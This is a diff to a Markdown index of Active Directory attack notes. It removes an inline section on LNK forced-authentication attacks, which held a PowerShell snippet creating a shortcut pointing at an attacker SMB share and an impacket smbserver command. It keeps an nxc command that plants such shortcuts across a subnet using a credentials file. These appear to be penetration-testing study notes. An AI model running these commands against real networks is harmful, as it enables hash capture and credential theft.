@@ -23,22 +23,7 @@
     - [GMSA abusing and s4u delegation attack](./gmsaAbusing.md)
     - [RID cycling attack](./ridCyclingAttack.md)
     - [MSSQL Microsoft SQL Server attacks](./mssql.md)
-- [LNK File Attacks](https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication#execution-via-.rtf): `nxc smb 172.16.139.0/24 -u 'pthorpe' -p creds.txt -M slinky -o SERVER=172.16.139.10 NAME=urgent`
-    - Código:
-
-    ```powershell
-    $objShell = New-Object -ComObject WScript.shell
-    $lnk = $objShell.CreateShortcut("C:\test.lnk")
-    $lnk.TargetPath = "\\192.168.138.149\@test.png"
-    $lnk.WindowStyle = 1
-    $lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
-    $lnk.Description = "Test"
-    $lnk.HotKey = "Ctrl+Alt+T"
-    $lnk.Save()
-    ``` 
-
-    - `smbserver.py -smb2support "icon" .`
-
+- [LNK File Attacks](./lnk-attacks.md): `nxc smb 172.16.139.0/24 -u 'pthorpe' -p creds.txt -M slinky -o SERVER=172.16.139.10 NAME=urgent`
 
 ### Post compromise attack strategy
 - 1st
